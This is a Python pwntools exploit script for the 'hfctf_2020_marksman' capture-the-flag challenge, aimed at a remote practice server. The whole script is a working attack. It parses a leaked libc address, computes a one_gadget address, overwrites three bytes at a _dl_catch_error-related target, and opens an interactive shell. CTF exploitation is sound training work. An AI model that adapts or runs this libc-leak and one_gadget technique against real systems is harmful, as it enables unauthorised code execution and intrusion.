from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('hfctf_2020_marksman')
io = remote('node4.buuoj.cn', 27916)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
libc = ELF('libc-2.27.so')
elf = ELF('hfctf_2020_marksman')
strlen_got = 0x3eb0a8
_dl_catch_error_offset = 0x5f4038
one_gadgets = [0x4f2c5, 0x4f322, 0xe569f, 0xe5858, 0xe585f, 0xe5863, 0x10a38c, 0x10a398]

io.recvuntil('I placed the target near: ')
libc_base = int(io.recvline()[:-1], 16) - libc.sym['puts']
log.success('libc_base: ' + hex(libc_base))

one_gadget = libc_base + one_gadgets[2]
log.success('one_gadget: ' + hex(one_gadget))
target = libc_base + _dl_catch_error_offset
log.success('target: ' + hex(target))
io.sendlineafter('shoot!shoot!\n', str(target))
# gdb.attach(io)
# pause()
io.sendlineafter('biang!\n', p8(p64(one_gadget)[0]))
io.sendlineafter('biang!\n', p8(p64(one_gadget)[1]))
io.sendlineafter('biang!\n', p8(p64(one_gadget)[2]))
io.interactive()

